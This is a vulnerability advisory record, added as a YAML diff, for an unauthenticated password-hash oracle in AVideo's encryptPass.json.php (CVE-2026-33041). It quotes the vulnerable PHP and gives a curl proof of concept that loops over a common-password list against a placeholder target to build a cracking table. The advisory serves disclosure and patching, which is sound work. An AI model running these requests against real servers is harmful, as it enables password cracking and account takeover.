@@ -1,0 +1,115 @@
+advisory_id: GHSA-px7x-gq96-rmp5
+datasource_id: github_osv/GHSA-px7x-gq96-rmp5
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-px7x-gq96-rmp5/GHSA-px7x-gq96-rmp5.json
+aliases:
+  - CVE-2026-33041
+summary: |
+  AVideo has an Unauthenticated Password Hash Oracle via encryptPass.json.php
+  ### Summary
+
+  `/objects/encryptPass.json.php` exposes the application's password hashing algorithm to any unauthenticated user. An attacker can submit arbitrary passwords and receive their hashed equivalents, enabling offline password cracking against leaked database hashes.
+
+  ### Details
+
+  **File:** `objects/encryptPass.json.php`
+
+  ```php
+  $obj->password = @$_REQUEST['pass'];
+  $obj->encryptedPassword = encryptPassword($obj->password);
+  echo json_encode($obj);
+  ```
+
+  No authentication is required. The `encryptPassword()` function in `objects/functions.php` (line ~2101) uses:
+
+  ```php
+  function encryptPassword($password, $noSalt = false) {
+      if (!empty($advancedCustomUser->encryptPasswordsWithSalt) && !empty($global['salt']) && empty($noSalt)) {
+          $password .= $global['salt'];
+      }
+      return md5(hash('whirlpool', sha1($password)));
+  }
+  ```
+
+  By default, salt is NOT enabled (`encryptPasswordsWithSalt` is off), making the hash deterministic and identical to what's stored in the database.
+
+  ### PoC
+
+  ```bash
+  # Get the hash for any password
+  curl 'https://TARGET/objects/encryptPass.json.php?pass=admin123'
+  # Response: {"password":"admin123","encryptedPassword":"<hash>"}
+
+  # Build a rainbow table for common passwords
+  for pass in $(cat rockyou-top1000.txt); do
+    curl -s "https://TARGET/objects/encryptPass.json.php?pass=$pass"
+  done
+  ```
+
+  If an attacker obtains password hashes from the database (via SQL injection, backup exposure, etc.), they can instantly crack them by comparing against pre-computed hashes from this endpoint.
+
+  ### Impact
+
+  **Password Cracking Acceleration** — This endpoint eliminates the need for an attacker to reverse-engineer the hashing algorithm. Combined with the weak hash chain (md5+whirlpool+sha1, no salt by default), an attacker with access to database hashes can crack passwords extremely quickly.
+
+  Additionally, this reveals whether salt is enabled and the exact hashing implementation, which is sensitive cryptographic configuration.
+impacted_packages:
+  - purl: pkg:composer/wwbn/avideo
+    affected_versions: vers:composer/<=25.0.0
+    fixed_versions:
+    affected_packages:
+      - pkg:composer/wwbn/avideo@10.4.0
+      - pkg:composer/wwbn/avideo@10.8.0
+      - pkg:composer/wwbn/avideo@11.0.0
+      - pkg:composer/wwbn/avideo@11.1.0
+      - pkg:composer/wwbn/avideo@11.1.1
+      - pkg:composer/wwbn/avideo@11.5.0
+      - pkg:composer/wwbn/avideo@11.6.0
+      - pkg:composer/wwbn/avideo@12.4.0
+      - pkg:composer/wwbn/avideo@14.3.0
+      - pkg:composer/wwbn/avideo@14.3.1
+      - pkg:composer/wwbn/avideo@14.4.0
+      - pkg:composer/wwbn/avideo@18.0.0
+      - pkg:composer/wwbn/avideo@21.0.0
+      - pkg:composer/wwbn/avideo@22.0.0
+      - pkg:composer/wwbn/avideo@24.0.0
+      - pkg:composer/wwbn/avideo@25.0.0
+    fixed_packages: []
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/wwbn/avideo
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/wwbn/avideo
+        commit: ea2efd04464560cca93c9ab48b445dbb944a4e46
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '5.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-px7x-gq96-rmp5/GHSA-px7x-gq96-rmp5.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-200
+references:
+  - url: https://github.com/WWBN/AVideo
+    reference_type:
+    reference_id:
+  - url: https://github.com/WWBN/AVideo/commit/ea2efd04464560cca93c9ab48b445dbb944a4e46
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-33041
+    reference_type:
+    reference_id: CVE-2026-33041
+  - url: https://github.com/WWBN/AVideo/security/advisories/GHSA-px7x-gq96-rmp5
+    reference_type:
+    reference_id: GHSA-px7x-gq96-rmp5
+exploits: []
